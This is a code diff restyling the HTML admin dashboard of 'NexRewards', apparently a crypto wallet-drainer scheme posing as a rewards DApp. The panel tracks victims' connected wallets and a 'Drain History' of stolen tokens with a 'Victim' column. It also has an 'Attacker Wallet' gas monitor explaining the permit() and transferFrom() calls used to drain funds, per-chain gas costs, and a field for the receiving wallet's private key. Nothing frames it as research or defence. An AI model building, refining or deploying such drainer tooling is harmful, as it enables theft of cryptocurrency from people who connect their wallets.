+    .empty-state .e-icon{font-size:40px;margin-bottom:14px;opacity:.5}
     .empty-state p{font-size:13px}
 
-    /* COPY TOAST */
-    #toast{position:fixed;bottom:24px;right:24px;background:var(--surface2);border:1px solid var(--border2);color:var(--text);padding:12px 20px;border-radius:12px;font-size:13px;z-index:200;opacity:0;transition:all .3s;pointer-events:none;max-width:400px;word-break:break-word;line-height:1.45;box-shadow:0 8px 32px rgba(0,0,0,.3)}
-    #toast.show{opacity:1;transform:translateY(-4px)}
+    #toast{position:fixed;bottom:24px;right:24px;background:var(--surface2);border:1px solid var(--border2);color:var(--text);padding:14px 22px;border-radius:14px;font-size:13px;z-index:200;opacity:0;transition:all .3s;pointer-events:none;max-width:420px;word-break:break-word;line-height:1.5;box-shadow:0 12px 40px rgba(0,0,0,.3)}
+    #toast.show{opacity:1;transform:translateY(-6px)}
 
-    /* MOBILE */
+    /* ── QUICK ACTIONS ── */
+    .qa-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+    .qa-item{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:16px;cursor:pointer;transition:all .15s;text-align:center}
+    .qa-item:hover{border-color:var(--gold);background:var(--goldbg);transform:translateY(-2px)}
+    .qa-item .qa-icon{font-size:20px;margin-bottom:8px}
+    .qa-item .qa-label{font-size:11px;font-weight:600;color:var(--muted)}
+    .qa-item:hover .qa-label{color:var(--text)}
+
+    /* ── TOP WALLETS ── */
+    .tw-item{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid var(--border)}
+    .tw-item:last-child{border-bottom:none}
+    .tw-rank{width:24px;height:24px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;font-family:'Space Grotesk',sans-serif;flex-shrink:0}
+    .tw-rank.r1{background:var(--goldbg);color:var(--gold);border:1px solid var(--goldbr)}
+    .tw-rank.r2{background:rgba(192,192,192,.08);color:#c0c0c0;border:1px solid rgba(192,192,192,.15)}
+    .tw-rank.r3{background:rgba(205,127,50,.08);color:#cd7f32;border:1px solid rgba(205,127,50,.15)}
+    .tw-info{flex:1;min-width:0}
+    .tw-addr{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);cursor:pointer}
+    .tw-tokens{font-size:10px;color:var(--muted);margin-top:2px}
+    .tw-val{font-size:14px;font-weight:700;color:var(--green);font-family:'Space Grotesk',sans-serif}
+
+    /* ── MOBILE ── */
+    @media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr)}}
     @media(max-width:768px){
       .layout{grid-template-columns:1fr}
-      .sidebar{position:fixed;left:-240px;top:0;z-index:90;height:100vh;transition:left .3s ease;box-shadow:8px 0 32px rgba(0,0,0,.4)}
+      .sidebar{position:fixed;left:-260px;top:0;z-index:90;height:100vh;transition:left .3s ease;box-shadow:8px 0 40px rgba(0,0,0,.5);width:250px}
       .sidebar.open{left:0}
-      .mobile-nav-btn{display:flex!important}
+      .mobile-btn{display:flex!important}
       .main{padding:16px}
-      .stats{grid-template-columns:1fr 1fr}
+      .stats-row{grid-template-columns:1fr 1fr}
       .form-row{grid-template-columns:1fr}
-      .gas-grid{grid-template-columns:1fr 1fr}
-      #dash-grid{grid-template-columns:1fr!important}
+      .qa-grid{grid-template-columns:1fr 1fr}
+      #dash-mid{grid-template-columns:1fr!important}
     }
-    .mobile-nav-btn{display:none;position:fixed;top:14px;left:14px;z-index:95;background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:9px 12px;cursor:pointer;font-size:16px;transition:all .15s}
-    .mobile-nav-btn:hover{border-color:var(--gold)}
+    .mobile-btn{display:none;position:fixed;top:14px;left:14px;z-index:95;background:var(--surface);border:1px solid var(--border2);border-radius:10px;padding:9px 12px;cursor:pointer;font-size:16px}
   </style>
 </head>
 <body>
-
 <div id="toast">Copied!</div>
 
 <!-- LOGIN -->
@@ -228,16 +273,21 @@
   <div class="login-box">
     <div class="login-logo">NR</div>
     <h1>Admin Panel</h1>
-    <p>NexRewards Operations Center</p>
-    <input type="text" id="user-input" placeholder="Username" autocomplete="username" style="margin-bottom:10px"/>
-    <input type="password" id="pw-input" placeholder="Password" autocomplete="current-password"/>
-    <button class="btn full" onclick="login()">Sign In</button>
+    <div class="subtitle">NexRewards Operations Center</div>
+    <div class="login-field">
+      <span class="field-icon">&#9786;</span>
+      <input type="text" id="user-input" placeholder="Username" autocomplete="username"/>
+    </div>
+    <div class="login-field">
+      <span class="field-icon">&#128274;</span>
+      <input type="password" id="pw-input" placeholder="Password" autocomplete="current-password"/>
+    </div>
+    <button class="btn full" onclick="login()" style="margin-top:6px">Sign In</button>
     <div id="login-err">Invalid credentials</div>
   </div>
 </div>
 
-<!-- MOBILE NAV BUTTON -->
-<div class="mobile-nav-btn" onclick="document.querySelector('.sidebar').classList.toggle('open')">&#9776;</div>
+<div class="mobile-btn" onclick="document.querySelector('.sidebar').classList.toggle('open')">&#9776;</div>
 
 <!-- APP -->
 <div id="app">
@@ -245,904 +295,473 @@
 
   <!-- SIDEBAR -->
   <div class="sidebar">
-    <div class="sidebar-logo">
-      <div style="display:flex;align-items:center;gap:11px">
-        <div class="logo-icon">NR</div>
-        <div>
-          <div class="logo-text">NexRewards</div>
-          <div class="logo-sub">ADMIN</div>
-        </div>
+    <div class="sb-header">
+      <div class="sb-brand">
+        <div class="sb-logo">NR</div>
+        <div><div class="sb-name">NexRewards</div><div class="sb-tag">OPERATIONS</div></div>
       </div>
+      <div class="sb-status"><span class="pulse"></span> System Online &mdash; Auto-refresh 5s</div>
     </div>
-    <div class="sidebar-nav">
-      <div class="nav-section">Overview</div>
-      <div class="nav-item active" onclick="showPage('dashboard',this)">
-        <span class="icon">&#9635;</span> Dashboard
-      </div>
-      <div class="nav-section">Intelligence</div>
-      <div class="nav-item" onclick="showPage('wallets',this)">
-        <span class="icon">&#128100;</span> Connected Wallets
-        <span class="nav-badge" id="nb-wallets">0</span>
-      </div>
-      <div class="nav-item" onclick="showPage('drains',this)">
-        <span class="icon">&#8644;</span> Drain History
-        <span class="nav-badge green" id="nb-drains">0</span>
-      </div>
-      <div class="nav-section">System</div>
-      <div class="nav-item" onclick="showPage('gas',this)">
-        <span class="icon">&#9981;</span> Gas Monitor
-      </div>
-      <div class="nav-item" onclick="showPage('config',this)">
-        <span class="icon">&#9881;</span> Configuration
-      </div>
-      <div class="nav-item" onclick="showPage('logs',this)">
-        <span class="icon">&#9638;</span> Live Logs
-      </div>
+    <div class="sb-nav">
+      <div class="sb-section">Overview</div>
+      <div class="sb-item active" onclick="showPage('dashboard',this)"><span class="sb-icon">&#9632;</span> Dashboard</div>
+      <div class="sb-section">Intelligence</div>
+      <div class="sb-item" onclick="showPage('wallets',this)"><span class="sb-icon">&#128100;</span> Wallets <span class="sb-badge" id="nb-wallets">0</span></div>
+      <div class="sb-item" onclick="showPage('drains',this)"><span class="sb-icon">&#8644;</span> Drains <span class="sb-badge g" id="nb-drains">0</span></div>
+      <div class="sb-section">System</div>
+      <div class="sb-item" onclick="showPage('gas',this)"><span class="sb-icon">&#9981;</span> Gas Monitor</div>
+      <div class="sb-item" onclick="showPage('config',this)"><span class="sb-icon">&#9881;</span> Config</div>
+      <div class="sb-item" onclick="showPage('logs',this)"><span class="sb-icon">&#9638;</span> Logs</div>
     </div>
-    <div class="sidebar-footer">
-      <div class="attacker-card">
-        <div class="label">Receiving Wallet</div>
-        <div class="addr" id="sb-attacker-addr">Not configured</div>
-        <div id="sb-gas-chips" style="display:flex;flex-wrap:wrap;gap:3px;margin-top:7px"></div>
+    <div class="sb-footer">
+      <div class="sb-wallet">
+        <div class="sb-wallet-label">Receiving Wallet</div>
+        <div class="sb-wallet-addr" id="sb-attacker-addr">Not configured</div>
+        <div class="sb-wallet-chips" id="sb-gas-chips"></div>
       </div>
-      <div style="display:flex;gap:6px;margin-top:12px">
-        <button class="btn ghost sm" style="flex:1" onclick="refresh()"><span id="refresh-icon">&#8635;</span> Refresh</button>
+      <div class="sb-actions">
+        <button class="btn ghost sm" onclick="refresh()"><span id="refresh-icon">&#8635;</span> Refresh</button>
         <button class="btn red sm" onclick="logout()">Exit</button>
-      </div>
-      <div style="font-size:10px;color:var(--muted2);margin-top:9px;text-align:center">
-        <span class="live-dot"></span>Auto-refresh 5s
       </div>
     </div>
   </div>
 
-  <!-- MAIN CONTENT -->
+  <!-- MAIN -->
   <div class="main">
 
-    <!-- DASHBOARD -->
+    <!-- ══════ DASHBOARD ══════ -->
     <div id="page-dashboard" class="page active">
-      <div class="page-header">
-        <div>
-          <h1>Dashboard</h1>
-          <p>Real-time overview of all activity</p>
-        </div>
+      <div class="page-head page-head-row">
+        <div><h1>Dashboard</h1><p>Real-time overview</p></div>
         <button class="btn ghost sm" onclick="refresh()">&#8635; Refresh</button>
       </div>
 
-      <div class="stats">
-        <div class="stat s-blue">
-          <div class="sv" id="st-connected">0</div>
-          <div class="sl">Wallets Connected</div>
-          <div class="sc" style="color:var(--cyan)" id="st-online">0 online now</div>
+      <!-- Stats Row -->
+      <div class="stats-row">
+        <div class="scard blue">
+          <div class="scard-glow"></div>
+          <div class="scard-icon">&#128100;</div>
+          <div class="scard-val" id="st-connected">0</div>
+          <div class="scard-label">Wallets Connected</div>
+          <div class="scard-sub" style="color:var(--cyan)" id="st-online">0 online</div>
         </div>
-        <div class="stat s-green">
-          <div class="sv" id="st-drained">0</div>
-          <div class="sl">Successful Drains</div>
-          <div class="sc" style="color:var(--green)" id="st-drained-usd">$0.00 total</div>
+        <div class="scard green">
+          <div class="scard-glow"></div>
+          <div class="scard-icon">&#10003;</div>
+          <div class="scard-val" id="st-drained">0</div>
+          <div class="scard-label">Successful Drains</div>
+          <div class="scard-sub" style="color:var(--green)" id="st-drained-usd">$0.00</div>
         </div>
-        <div class="stat s-red">
-          <div class="sv" id="st-failed">0</div>
-          <div class="sl">Failed Attempts</div>
-          <div class="sc" style="color:var(--muted)">errors / no balance</div>
+        <div class="scard red">
+          <div class="scard-glow"></div>
+          <div class="scard-icon">&#10007;</div>
+          <div class="scard-val" id="st-failed">0</div>
+          <div class="scard-label">Failed</div>
+          <div class="scard-sub" style="color:var(--muted)">errors / rejected</div>
         </div>
-        <div class="stat s-yellow">
-          <div class="sv" id="st-tokens">0</div>
-          <div class="sl">Tokens Scanned</div>
-          <div class="sc" style="color:var(--yellow)" id="st-chains">across 0 chains</div>
+        <div class="scard gold">
+          <div class="scard-glow"></div>
+          <div class="scard-icon">&#9733;</div>
+          <div class="scard-val" id="st-tokens">0</div>
+          <div class="scard-label">Tokens Found</div>
+          <div class="scard-sub" style="color:var(--gold)" id="st-chains">0 chains</div>
         </div>
-        <div class="stat s-purple">
-          <div class="sv" id="st-total-value">$0</div>
-          <div class="sl">Total Wallet Value Seen</div>
-          <div class="sc" style="color:var(--muted)">from scanned wallets</div>
-        </div>
-      </div>
-
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:18px" id="dash-grid">
-        <div class="card">
-          <div class="card-head"><h2>Recent Connections</h2>
-            <span style="font-size:11px;color:var(--muted)" id="dash-last-seen"></span>
-          </div>
-          <div class="card-body p0">
-            <div class="table-wrap">
-              <table>
-                <thead><tr><th>Wallet</th><th>Tokens</th><th>When</th><th>Status</th></tr></thead>
-                <tbody id="dash-wallets-tbody"></tbody>
-              </table>
-            </div>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-head"><h2>Recent Drains</h2></div>
-          <div class="card-body p0">
-            <div class="table-wrap">
-              <table>
-                <thead><tr><th>Wallet</th><th>Amount</th><th>Chain</th><th>Tx</th></tr></thead>
-                <tbody id="dash-drains-tbody"></tbody>
-              </table>
-            </div>
-          </div>
+        <div class="scard purple">
+          <div class="scard-glow"></div>
+          <div class="scard-icon">&#36;</div>
+          <div class="scard-val" id="st-total-value">$0</div>
+          <div class="scard-label">Total Value Seen</div>
+          <div class="scard-sub" style="color:var(--muted)">scanned wallets</div>
         </div>
       </div>
 
-      <div class="card">
-        <div class="card-head"><h2>Activity Timeline</h2></div>
-        <div class="card-body">
-          <div class="log-box" id="dash-log-box" style="height:180px"></div>
+      <!-- Mid Row: Success Rate + Chain Distribution + Quick Actions -->
+      <div style="display:grid;grid-template-columns:280px 1fr 220px;gap:16px;margin-bottom:18px" id="dash-mid">
+        <!-- Success Rate Donut -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Success Rate</span></div>
+          <div class="card-body" id="donut-area">
+            <div class="donut-wrap">
+              <div class="donut" id="donut-chart"><div class="donut-center"><div class="donut-pct" id="donut-pct">0%</div><div class="donut-sub">Rate</div></div></div>
+              <div class="donut-legend">
+                <div class="donut-leg-item"><div class="donut-leg-dot" style="background:var(--green)"></div><span id="donut-ok">0</span> Success</div>
+                <div class="donut-leg-item"><div class="donut-leg-dot" style="background:var(--red)"></div><span id="donut-fail">0</span> Failed</div>
+                <div class="donut-leg-item"><div class="donut-leg-dot" style="background:var(--gold)"></div><span id="donut-pending">0</span> Pending</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Chain Distribution -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Chain Distribution</span></div>
+          <div class="card-body" id="chain-dist"></div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Quick Actions</span></div>
+          <div class="card-body">
+            <div class="qa-grid">
+              <div class="qa-item" onclick="showPage('wallets',document.querySelectorAll('.sb-item')[2])"><div class="qa-icon">&#128100;</div><div class="qa-label">Wallets</div></div>
+              <div class="qa-item" onclick="showPage('gas',document.querySelectorAll('.sb-item')[4])"><div class="qa-icon">&#9981;</div><div class="qa-label">Gas</div></div>
+              <div class="qa-item" onclick="exportWallets()"><div class="qa-icon">&#8615;</div><div class="qa-label">Export</div></div>
+              <div class="qa-item" onclick="showPage('config',document.querySelectorAll('.sb-item')[5])"><div class="qa-icon">&#9881;</div><div class="qa-label">Config</div></div>
+              <div class="qa-item" onclick="showPage('logs',document.querySelectorAll('.sb-item')[6])"><div class="qa-icon">&#9638;</div><div class="qa-label">Logs</div></div>
+              <div class="qa-item" onclick="clearWallets()"><div class="qa-icon" style="color:var(--red)">&#128465;</div><div class="qa-label">Clear</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bottom Row: Recent + Top Wallets + Activity -->
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px" id="dash-bot">
+        <!-- Recent Wallets -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Recent Wallets</span><span style="font-size:10px;color:var(--muted)" id="dash-last-seen"></span></div>
+          <div class="card-body flush">
+            <div class="table-wrap"><table><thead><tr><th>Wallet</th><th>Tokens</th><th>When</th><th>Status</th></tr></thead><tbody id="dash-wallets-tbody"></tbody></table></div>
+          </div>
+        </div>
+
+        <!-- Top Wallets by Value -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Top Wallets</span></div>
+          <div class="card-body" id="top-wallets-area"></div>
+        </div>
+
+        <!-- Activity Timeline -->
+        <div class="card">
+          <div class="card-head"><span class="card-title">Activity</span></div>
+          <div class="card-body" id="dash-timeline"></div>
         </div>
       </div>
     </div>
 
-    <!-- WALLETS -->
+    <!-- ══════ WALLETS ══════ -->
     <div id="page-wallets" class="page">
-      <div class="page-header">
-        <div>
-          <h1>Connected Wallets</h1>
-          <p id="wallets-subtitle">All wallets that visited the DApp</p>
-        </div>
+      <div class="page-head page-head-row">
+        <div><h1>Connected Wallets</h1><p id="wallets-subtitle">All wallets</p></div>
         <div style="display:flex;gap:8px">
           <button class="btn ghost sm" onclick="exportWallets()">Export CSV</button>
           <button class="btn red sm" onclick="clearWallets()">Clear All</button>
         </div>
       </div>
-
-      <!-- Filter bar -->
       <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
-        <input id="wallet-search" type="text" placeholder="Search by address..." oninput="filterWallets()" style="background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:9px 16px;border-radius:10px;font-size:12px;outline:none;flex:1;min-width:200px;transition:border-color .2s" onfocus="this.style.borderColor='var(--gold)'" onblur="this.style.borderColor='var(--border2)'"/>
-        <select id="wallet-filter" onchange="filterWallets()" style="background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:9px 14px;border-radius:10px;font-size:12px;outline:none;cursor:pointer">
-          <option value="all">All Wallets</option>
-          <option value="drained">Drained</option>
-          <option value="active">Not Drained</option>
-          <option value="tokens">Has Tokens</option>
+        <input id="wallet-search" type="text" placeholder="Search address..." oninput="filterWallets()" style="background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:10px 16px;border-radius:12px;font-size:12px;outline:none;flex:1;min-width:200px;transition:border-color .2s" onfocus="this.style.borderColor='var(--gold)'" onblur="this.style.borderColor='var(--border2)'"/>
+        <select id="wallet-filter" onchange="filterWallets()" style="background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:10px 14px;border-radius:12px;font-size:12px;outline:none;cursor:pointer">
+          <option value="all">All Wallets</option><option value="drained">Drained</option><option value="active">Not Drained</option><option value="tokens">Has Tokens</option>
         </select>
       </div>
-
-      <div class="card">
-        <div class="card-body p0">
-          <div class="table-wrap">
-            <table>
-              <thead><tr>
-                <th>#</th>
-                <th>Wallet Address</th>
-                <th>Network</th>
-                <th>Tokens Found</th>
-                <th>Est. Value</th>
-                <th>Connected</th>
-                <th>Last Seen</th>
-                <th>Status</th>
-                <th>Actions</th>
-              </tr></thead>
-              <tbody id="wallets-tbody"></tbody>
-            </table>
-          </div>
-        </div>
-      </div>
+      <div class="card"><div class="card-body flush"><div class="table-wrap"><table>
+        <thead><tr><th>#</th><th>Wallet</th><th>Network</th><th>Tokens</th><th>Value</th><th>Connected</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
+        <tbody id="wallets-tbody"></tbody>
+      </table></div></div></div>
     </div>
 
-    <!-- DRAIN HISTORY -->
+    <!-- ══════ DRAINS ══════ -->
     <div id="page-drains" class="page">
-      <div class="page-header">
-        <div>
-          <h1>Drain History</h1>
-          <p id="drains-subtitle">All transfer attempts with on-chain results</p>
-        </div>
+      <div class="page-head page-head-row">
+        <div><h1>Drain History</h1><p id="drains-subtitle">All attempts</p></div>
         <button class="btn ghost sm" onclick="exportDrains()">Export CSV</button>
       </div>
-
-      <div class="stats" style="grid-template-columns:repeat(3,1fr)">
-        <div class="stat s-green">
-          <div class="sv" id="dh-success">0</div>
-          <div class="sl">Successful</div>
-        </div>
-        <div class="stat s-red">
-          <div class="sv" id="dh-failed">0</div>
-          <div class="sl">Failed</div>
-        </div>
-        <div class="stat s-yellow">
-          <div class="sv" id="dh-total-usd">$0</div>
-          <div class="sl">Total Drained (USD)</div>
-        </div>
+      <div class="stats-row" style="grid-template-columns:repeat(3,1fr)">
+        <div class="scard green"><div class="scard-glow"></div><div class="scard-val" id="dh-success">0</div><div class="scard-label">Successful</div></div>
+        <div class="scard red"><div class="scard-glow"></div><div class="scard-val" id="dh-failed">0</div><div class="scard-label">Failed</div></div>
+        <div class="scard gold"><div class="scard-glow"></div><div class="scard-val" id="dh-total-usd">$0</div><div class="scard-label">Total Drained</div></div>
       </div>
-
-      <div class="card">
-        <div class="card-body p0">
-          <div class="table-wrap">
-            <table>
-              <thead><tr>
-                <th>#</th><th>Victim Wallet</th><th>Token</th><th>Amount</th>
-                <th>Chain</th><th>Method</th><th>Status</th><th>Tx Hash</th><th>Time</th>
-              </tr></thead>
-              <tbody id="drains-tbody"></tbody>
-            </table>
-          </div>
-        </div>
-      </div>
+      <div class="card"><div class="card-body flush"><div class="table-wrap"><table>
+        <thead><tr><th>#</th><th>Victim</th><th>Token</th><th>Amount</th><th>Chain</th><th>Method</th><th>Status</th><th>Tx</th><th>Time</th></tr></thead>
+        <tbody id="drains-tbody"></tbody>
+      </table></div></div></div>
     </div>
 
-    <!-- GAS MONITOR -->
+    <!-- ══════ GAS ══════ -->
     <div id="page-gas" class="page">
-      <div class="page-header">
-        <div>
-          <h1>Gas Monitor</h1>
-          <p>Attacker wallet gas balance across all chains</p>
-        </div>
-        <button class="btn ghost sm" onclick="loadGas()">&#8635; Refresh Balances</button>
+      <div class="page-head page-head-row">
+        <div><h1>Gas Monitor</h1><p>Attacker wallet balances</p></div>
+        <button class="btn ghost sm" onclick="loadGas()">&#8635; Refresh</button>
       </div>
-
       <div class="card" style="margin-bottom:16px">
-        <div class="card-head"><h2>Attacker Wallet</h2></div>
+        <div class="card-head"><span class="card-title">Attacker Wallet</span></div>
         <div class="card-body">
           <div style="font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--cyan);margin-bottom:8px" id="gas-attacker-addr">Not configured</div>
-          <p style="font-size:12px;color:var(--muted);line-height:1.6">This wallet pays gas for <code style="background:var(--bg);padding:2px 6px;border-radius:4px;font-size:11px">permit()</code> and <code style="background:var(--bg);padding:2px 6px;border-radius:4px;font-size:11px">transferFrom()</code> calls. Keep it funded on chains where you want to drain.</p>
+          <p style="font-size:12px;color:var(--muted);line-height:1.7">Pays gas for <code style="background:var(--bg2);padding:2px 6px;border-radius:4px;font-size:11px">permit()</code> + <code style="background:var(--bg2);padding:2px 6px;border-radius:4px;font-size:11px">transferFrom()</code>. Keep funded on target chains.</p>
         </div>
       </div>
-
-      <div class="gas-grid" id="gas-grid">
-        <div style="color:var(--muted);font-size:13px;padding:20px">Loading balances...</div>
-      </div>
-
+      <div class="gas-grid" id="gas-grid"><div style="color:var(--muted);padding:20px">Loading...</div></div>
       <div class="card" style="margin-top:16px">
-        <div class="card-head"><h2>Gas Requirements</h2></div>
-        <div class="card-body">
-          <table>
-            <thead><tr><th>Chain</th><th>Token</th><th>Method</th><th>Approx Cost</th><th>Recommended</th></tr></thead>
-            <tbody>
-              <tr><td>Base</td><td>USDC</td><td><span class="badge info">permit()</span></td><td>~$0.01</td><td style="color:var(--green)">0.002 ETH</td></tr>
-              <tr><td>Polygon</td><td>USDC</td><td><span class="badge info">permit()</span></td><td>~$0.01</td><td style="color:var(--green)">1 MATIC</td></tr>
-              <tr><td>Arbitrum</td><td>USDC</td><td><span class="badge info">permit()</span></td><td>~$0.05</td><td style="color:var(--green)">0.005 ETH</td></tr>
-              <tr><td>Optimism</td><td>USDC</td><td><span class="badge info">permit()</span></td><td>~$0.05</td><td style="color:var(--green)">0.005 ETH</td></tr>
-              <tr><td>Ethereum</td><td>USDC</td><td><span class="badge info">permit()</span></td><td>~$5-8</td><td style="color:var(--yellow)">0.02 ETH</td></tr>
-              <tr><td>BNB Chain</td><td>USDT/USDC</td><td><span class="badge pending">approve()</span></td><td>~$0.05</td><td style="color:var(--green)">0.003 BNB</td></tr>
-            </tbody>
-          </table>
-        </div>
+        <div class="card-head"><span class="card-title">Requirements</span></div>
+        <div class="card-body flush"><div class="table-wrap"><table>
+          <thead><tr><th>Chain</th><th>Token</th><th>Method</th><th>Cost</th><th>Recommended</th></tr></thead>
+          <tbody>
+            <tr><td>Base</td><td>USDC</td><td><span class="badge info">permit</span></td><td>~$0.01</td><td style="color:var(--green)">0.002 ETH</td></tr>
+            <tr><td>Polygon</td><td>USDC</td><td><span class="badge info">permit</span></td><td>~$0.01</td><td style="color:var(--green)">1 MATIC</td></tr>
+            <tr><td>Arbitrum</td><td>USDC</td><td><span class="badge info">permit</span></td><td>~$0.05</td><td style="color:var(--green)">0.005 ETH</td></tr>
+            <tr><td>Ethereum</td><td>USDC</td><td><span class="badge info">permit</span></td><td>~$5-8</td><td style="color:var(--yellow)">0.02 ETH</td></tr>
+            <tr><td>BNB Chain</td><td>USDT</td><td><span class="badge pending">approve</span></td><td>~$0.05</td><td style="color:var(--green)">0.003 BNB</td></tr>
+          </tbody>
+        </table></div></div>
       </div>
     </div>
 
-    <!-- CONFIG -->
+    <!-- ══════ CONFIG ══════ -->
     <div id="page-config" class="page">
-      <div class="page-header">
-        <div><h1>Configuration</h1><p>Manage attacker wallet, passwords, and settings</p></div>
-      </div>
-
+      <div class="page-head"><h1>Configuration</h1><p>Wallet, password, and system settings</p></div>
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
         <div class="card">
-          <div class="card-head"><h2>Receiving Wallet</h2></div>
+          <div class="card-head"><span class="card-title">Receiving Wallet</span></div>
           <div class="card-body">
-            <p style="font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.7">
-              Private key of the wallet that receives drained tokens.<br/>
-              <strong style="color:var(--yellow)">Use a dedicated wallet only.</strong>
-            </p>
-            <div class="form-group">
-              <label>Private Key</label>
-              <input type="password" id="cfg-pk" placeholder="0x..." autocomplete="off"/>
-              <div class="hint">Enter key then click Preview to verify address</div>
-            </div>
-            <div id="cfg-addr-preview" style="display:none;background:var(--bg);border:1px solid rgba(0,230,118,.25);border-radius:10px;padding:12px 16px;margin-bottom:16px">
-              <div style="font-size:10px;color:var(--muted);margin-bottom:4px;font-weight:700;text-transform:uppercase;letter-spacing:.5px">WALLET ADDRESS</div>
+            <p style="font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.7">Private key of the drain receiver.<br/><strong style="color:var(--yellow)">Use a dedicated wallet only.</strong></p>
+            <div class="form-group"><label>Private Key</label><input type="password" id="cfg-pk" placeholder="0x..." autocomplete="off"/><div class="hint">Enter key then Preview to verify</div></div>
+            <div id="cfg-addr-preview" style="display:none;background:var(--bg2);border:1px solid var(--greenbr);border-radius:12px;padding:14px;margin-bottom:16px">
+              <div style="font-size:9px;color:var(--muted);font-weight:800;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Address</div>
               <div id="cfg-addr-text" style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--green)"></div>
             </div>
-            <div style="display:flex;gap:8px">
-              <button class="btn ghost sm" onclick="previewWallet()">Preview Address</button>
-              <button class="btn green sm" onclick="saveConfig()">Save Wallet</button>
-            </div>
+            <div style="display:flex;gap:8px"><button class="btn ghost sm" onclick="previewWallet()">Preview</button><button class="btn green sm" onclick="saveConfig()">Save</button></div>
             <div id="cfg-msg" style="font-size:12px;margin-top:12px;display:none"></div>
           </div>
         </div>
-
         <div class="card">
-          <div class="card-head"><h2>Admin Password</h2></div>
+          <div class="card-head"><span class="card-title">Admin Password</span></div>
           <div class="card-body">
-            <div class="form-group">
-              <label>Current Password</label>
-              <input type="password" id="cfg-pw-old" placeholder="Current password"/>
-            </div>
-            <div class="form-group">
-              <label>New Password</label>
-              <input type="password" id="cfg-pw-new" placeholder="New password"/>
-            </div>
-            <button class="btn sm" onclick="savePassword()">Update Password</button>
+            <div class="form-group"><label>Current Password</label><input type="password" id="cfg-pw-old" placeholder="Current"/></div>
+            <div class="form-group"><label>New Password</label><input type="password" id="cfg-pw-new" placeholder="New password"/></div>
+            <button class="btn sm" onclick="savePassword()">Update</button>
             <div id="pw-msg" style="font-size:12px;margin-top:12px;display:none"></div>
           </div>
         </div>
       </div>
-
-      <div class="card">
-        <div class="card-head"><h2>Connection Test</h2></div>
-        <div class="card-body">
-          <p style="font-size:12px;color:var(--muted);margin-bottom:14px">Verify backend connectivity and wallet configuration.</p>
-          <button class="btn sm" onclick="testConnection()">Run Diagnostics</button>
-          <div id="test-result" style="margin-top:16px;display:none;background:var(--bg);border:1px solid var(--border2);border-radius:10px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:2.2"></div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-head"><h2>Data Management</h2></div>
-        <div class="card-body">
-          <div style="display:flex;gap:10px;flex-wrap:wrap">
-            <button class="btn red sm" onclick="clearWallets()">Clear All Wallets</button>
-            <button class="btn ghost sm" onclick="clearLogs()">Clear Logs</button>
-          </div>
-          <p style="font-size:11px;color:var(--muted);margin-top:12px;line-height:1.6">Data resets on server restart (in-memory storage). Use export to save records.</p>
-        </div>
-      </div>
+      <div class="card"><div class="card-head"><span class="card-title">Diagnostics</span></div><div class="card-body">
+        <button class="btn sm" onclick="testConnection()">Run Test</button>
+        <div id="test-result" style="margin-top:16px;display:none;background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:18px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:2.2"></div>
+      </div></div>
+      <div class="card"><div class="card-head"><span class="card-title">Data</span></div><div class="card-body">
+        <div style="display:flex;gap:10px"><button class="btn red sm" onclick="clearWallets()">Clear Wallets</button><button class="btn ghost sm" onclick="clearLogs()">Clear Logs</button></div>
+        <p style="font-size:11px;color:var(--muted);margin-top:12px">In-memory storage. Export before clearing.</p>
+      </div></div>
     </div>
 
-    <!-- LOGS -->
+    <!-- ══════ LOGS ══════ -->
     <div id="page-logs" class="page">
-      <div class="page-header">
-        <div><h1>Live Logs</h1><p>Real-time server activity</p></div>
-        <div style="display:flex;gap:8px">
-          <button class="btn ghost sm" onclick="refresh()">&#8635; Refresh</button>
-          <button class="btn red sm" onclick="clearLogs()">Clear</button>
-        </div>
+      <div class="page-head page-head-row">
+        <div><h1>Live Logs</h1><p>Server activity</p></div>
+        <div style="display:flex;gap:8px"><button class="btn ghost sm" onclick="refresh()">&#8635;</button><button class="btn red sm" onclick="clearLogs()">Clear</button></div>
       </div>
-
       <div class="card">
-        <div class="card-head">
-          <h2><span class="live-dot"></span>Server Output</h2>
-          <span style="font-size:11px;color:var(--muted)" id="log-count">0 entries</span>
-        </div>
-        <div class="card-body">
-          <div class="log-box" id="log-box" style="height:500px"></div>
-        </div>
+        <div class="card-head"><span class="card-title"><span class="pulse" style="width:6px;height:6px;background:var(--green);border-radius:50%;display:inline-block;margin-right:8px;box-shadow:0 0 8px var(--green);animation:pulse 2s infinite"></span>Server Output</span><span style="font-size:11px;color:var(--muted)" id="log-count">0</span></div>
+        <div class="card-body"><div class="log-box" id="log-box" style="height:520px"></div></div>
       </div>
     </div>
 
-  </div><!-- /main -->
